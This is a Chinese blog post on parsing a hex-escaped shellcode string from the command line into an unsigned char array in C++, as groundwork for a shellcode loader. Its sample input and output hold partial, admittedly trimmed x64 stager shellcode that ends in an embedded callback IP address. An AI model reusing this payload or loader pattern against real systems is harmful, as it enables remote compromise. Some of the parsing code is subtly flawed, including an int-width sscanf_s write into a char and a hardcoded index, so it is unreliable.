>- 敬告：为避免有人恶意分析，本文中对 shellcode 作了部分删减。所以长度对不上。

>- 因为蚂蚁笔记官方图片服务器极其不稳定，如果本文出现图片加载不出的问题，请转到此链接查看 https://shimo.im/docs/YqpKhVYYgwjk9xY8/
# 0x01 需求

**奇怪的需求：**

从命令行接收 shellcode，存储为无符号十六进制 char 数组。

**示例输入：**

```
\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\x29\xd8\x28\x48\xb6\x74\xa0\xa8\xcd\x7a\xf7\xb9\x40\x63\xfd\xd1\x1d\x60\x8f\x48\xcd\xee\xd2\x52\x9a\x75\x14\x60\x9e\x78\x9b\x2e\xc1\x59\xc1\xc6\x50\x1b\x57\xbd\xdd\x68\xd7\xb1\xf2\x27\x78\x3c\x0e\x64\x3f\x8e\xaa\x33\x67\x89\x4d\x6b\x21\xf6\x89\x0a\x4a\xbf\xba\x1d\x08\x0e\x04\xec\x9a\xb3\xab\x4c\x64\xd9\x7a\xf0\xf2\x09\x3c\x49\x70\x16\xfd\x7a\x9c\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x35\x34\x2e\x32\x30\x39\x2e\x38\x36\x2e\x35\x37\x00\x12\x34\x56\x78
```

**示例输出：**

```
/* length: 892 bytes */
unsigned char buf[] = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x51\xad\x27\xf6\x37\x7f\xb0\x7f\x93\x7f\x97\xa6\xcc\x22\xed\xa7\x91\x37\x6c\x86\x5b\x5d\xb4\x19\xeb\x39\x3e\xf7\xa8\xa6\x3e\xdc\x9b\xe2\x94\x4f\xc0\xe1\xd3\x7b\x1f\x93\x21\x65\x62\x45\x8b\x78\xf9\xbd\x53\x44\x64\xec\xeb\x27\xfa\xb6\x28\x5a\x02\x97\xaf\xb6\x52\x88\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x35\x34\x2e\x32\x30\x39\x2e\x38\x36\x2e\x35\x37\x00\x12\x34\x56\x78";
```

# 0x02 选择输入函数

输入函数可选：

- getchar()
- scanf_s()
- fgets()    # 从流、文件中获取字符串。

这里因为我是从命令行接收二进制流输入，所以选择 `getchar()` 或者 `scanf_s()` 都可以。


现在问题来了，我使用char字节数组接收命令行输入的字符串，这两个函数都需要输入字节数组的长度，我如何获得这个长度呢？


# 0x03 获取字节数组的长度


第一种思路是由谁输入，谁提供。多给一个需要用户输入的形参，也就是字节数组的长度。

但这样可能有溢出风险，不能太信任用户输入。


第二种思路是未免并不预先获知数值的个数，从获取的数据中计算。这样的话可以使用标准库中的 `vector` 类型，从而可以动态增长长度来容纳添加的新数值。

```
char x;
vector<char> shellcode;
while(cin >> x)
    shellcode.push_back(x);
```

注：实际是把一个二进制流字节 `\xcc` 变成了四个字符 `\`，`x`，`c`，`c`，所以储存的是字符的 ASCII 码，用 char 类型可以容纳。

现在开始尝试代码：

```
// crt_getchar.c
// Use getchar to read a line from stdin.
#include <vector>
#include <stdio.h>

using namespace std;
int main()
{
    vector<unsigned int> shellcode;
    int i, ch;
    printf_s("请输入您的 shellcode：\n");
    while(((ch = getchar()) != EOF)
        && (ch != '\n'))
    {
        shellcode.push_back(ch);
    }
    printf("shellcode size is %i", shellcode.size());
}
```

![title](https://leanote.com/api/file/getImage?fileId=5f6711d0ab644120150019d4)

从结果可以看出，是把每一个字符当做了一个char，没法直接按十六进制无符号整数接收。


所以我们只能先按字符串 vector 接收全部的值，获取 vector 长度，然后转为 unsigned char 数组。

总之，就是通过 vector 类型，我们避免了需要用户输入 shellcode 数组长度这样的脑残设计。

其实这样也有一个好处，接收了全部字符，不会被 `\x00` 截断（字符串是以 \0 结尾的）。

而我这样的输入是不会存在截断的，因为只有输入的数据在内存里是 `0x00` 才会截断。而这样的输入中，`0` 这个字符在内存中的值为 0x30（十进制48），不等于0x00，而我整个的输入中也没有等于 0x00 的单字符 `\0`，所以一定一定不会被截断（太棒了！）

![title](https://leanote.com/api/file/getImage?fileId=5f6722f7ab644120150019fb)

![title](https://leanote.com/api/file/getImage?fileId=5f672308ab644120150019fc)

# 0x04 char 类型 vector 转为 unsigned char 数组

```
#include <vector>
#include <string>
#include <stdio.h>

using namespace std;

int main()
{
    //1. 接收全部的 shellcode 字符
    vector<char> user_input;
    char ch;
    printf_s("请输入您的 shellcode：\n");
    while (((ch = getchar()) != EOF)
        && (ch != '\n'))
    {
        user_input.push_back(ch);
    }

    //2. 获取实际的 shellcode 数组长度
    typedef vector<char>::size_type vec_sz;
    vec_sz len = user_input.size() / 4;
    int num = (int)len;
    printf_s("\nshellcode 数组的长度为 %i", num);

    //3. 填充 shellcode 数组  
    unsigned char* shellcode;
    shellcode = new unsigned char[num];
    char temp[4];
    unsigned char hex_num;
    for (int i = 0, y = 0; i != user_input.size(); i = i + 4, y = y + 1)
    {
        printf("\n%i", i);
        temp[0] = user_input[i];
        temp[1] = user_input[i + 1];
        temp[2] = user_input[i + 2];
        temp[3] = user_input[i + 3];
        hex_num = (unsigned char)temp;
        printf("\n%s", temp);
        printf("\n%x", hex_num);
        shellcode[y] = hex_num;
    }
    printf_s("\nshellcode 字节数组长度为：%i", num);
    printf_s("\nshellcode[0] = %x", shellcode[0]);

    //4. delete释放内存，与new对应
    return 0;
}
```


我的想法是：

1. 我现在已经获得了用户输入的全部字符
2. 所以四个字符一组，如 \xcc，通过 (unsigned char) 强转无符号十六进制数。

```
hex_num = (unsigned char)temp;
```

但是：

- 1、结果不对：
![title](https://leanote.com/api/file/getImage?fileId=5f670234ab6441201500198f)
- 2、每个 temp 后面多了一些不可见字符，猜测是越界了

shellcode 数组中存入的数不是我想要的那个强转得到的无符号十六进制数。

我还做了一些别的努力，比如定义一个 `vector shellcode<unsigned char>` 每次通过 push_back() 去存入强转后的这个无符号十六进制数，但是结果也是一模一样的问题。

如何解决这个问题呢？其实 C 不支持这样直接转换。有一个函数可以用来进行此转换工作：


![title](https://leanote.com/api/file/getImage?fileId=5f6702f5ab64411e11001964)


`sscanf_s()` 函数用于从字符串中读取格式化的数据，在这里我们要从 temp 这个字节数组也就是字符串中读取 16 进制数，真实的 16 进制数其实是从 temp+2 开始的两个字符，另外格式化参数为 `%2X`，X 表示以十六进制形式输出；02 表示不足两位，前面补0输出；如果超过两位，则实际输出。

所以从 temp 字节数组读取十六进制数的代码为：

```
unsigned char hex_num;
sscanf_s(temp + 2, "%2X", &hex_num);
```

另外为了解决 temp 后面有垃圾数据的问题：

把 

```
char temp[4] 
```

变为：

```
char temp[5] = {0};
```

这样加个结束符0，便于打印出来。因为 c 字符串以0结束，这样就不会把内存里的垃圾数据读出来了。


#0x05 最终代码

```
#include <vector>
#include <string>
#include <stdio.h>

using namespace std;

int main()
{
    //1. 接收全部的 shellcode 字符
    vector<char> user_input;
    char ch;
    printf_s("请输入您的 shellcode：\n");
    while (((ch = getchar()) != EOF)
        && (ch != '\n'))
    {
        user_input.push_back(ch);
    }


    //2. 获取实际的 shellcode 数组长度
    typedef vector<char>::size_type vec_sz;
    vec_sz len = user_input.size() / 4;
    int num = (int)len;
    printf_s("\nshellcode 数组的长度为 %i\n", num);


    //3. 填充 shellcode 数组  
    unsigned char* shellcode;
    shellcode = new unsigned char[num];
    //加个结束符0，便于打印出来；c字符串以0结尾 这样就不会把内存里的垃圾数据读出来了
    char temp[5] = {0};
    //hex_num 是实际值
    unsigned char hex_num;
    for (int i = 0, y = 0; i != user_input.size(); i += 4, y++)
    {
        temp[0] = user_input[i];
        temp[1] = user_input[i + 1];
        temp[2] = user_input[i + 2];
        temp[3] = user_input[i + 3];
        //temp为打印值
        printf("\n%s", temp);

        //只能在此行之前打印 temp，此行会改变 temp 的值
        sscanf_s(temp + 2, "%2X", &hex_num);
        //printf("\n%x", hex_num);

        shellcode[y] = hex_num;
    }
    printf_s("\nshellcode 字节数组长度为：%i", num);
    printf_s("\nshellcode[0] = %x", shellcode[891]);


    //4. delete释放内存，与new对应
    //delete[] shellcode;
    user_input.clear();
    
    return 0;
}
```

效果非常完美：

![title](https://leanote.com/api/file/getImage?fileId=5f670f11ab644120150019be)

但是要注意，这样是打印不出来 shellcode 这个 unsigned char 数组的长度的。打印出来结果为4，原因可能是把 shellcode 当成指针处理了。

```
printf_s("\nshellcode 字节数组长度为：%i", sizeof(shellcode)/(sizeof shellcode[0]));
```

所以要使用 shellcode 数组的长度时候，我们还是通过 num 的值来使用。

#0x06 Todo


通过 `.bin` 文件读取二进制流（shellcode），直接作为数组来使用。 


-------------------


感谢 @idiot c4t 师傅和 @undefined 师傅！ 


-------


参考链接：

1. https://man.linuxde.net/hexdump
2. https://github.com/DimopoulosElias/SimpleShellcodeInjector/blob/master/SimpleShellcodeInjector.c #感觉比我写的简单嘤嘤嘤，但是思路是一样的